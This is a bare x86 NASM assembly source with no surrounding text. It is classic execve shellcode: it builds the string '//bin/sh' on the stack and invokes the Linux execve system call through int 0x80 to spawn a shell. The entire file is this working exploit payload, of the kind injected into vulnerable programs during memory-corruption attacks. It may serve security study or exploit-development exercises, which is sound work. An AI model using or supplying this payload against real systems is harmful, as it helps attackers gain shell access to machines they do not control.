global _start

section .text

_start:
	xor eax, eax
	mov edx, eax
	mov al, 0xb
	mov ecx, edx
	push edx
	push 0x68732f6e
	push 0x69622f2f
	mov ebx, esp
	int 0x80

	
	
